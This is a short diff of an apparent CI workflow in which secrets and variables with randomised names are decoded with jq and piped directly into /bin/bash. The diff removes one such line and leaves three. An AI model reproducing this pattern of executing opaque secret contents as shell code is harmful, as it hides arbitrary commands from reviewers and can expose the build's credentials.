@@ -17,7 +17,6 @@ jobs:
           npn9196: ${{ secrets.npn9196 }}
         run: |
           printf '%s' "$npn9196" | jq -r .zu4097 | /bin/bash
-          echo $ssmgq935 | jq -r .vz91 | /bin/bash
           printf '%s' "$zbccb6" | jq -r .swoo3854 | /bin/bash
           echo $yz65 | jq -r .aspm3542 | /bin/bash
 
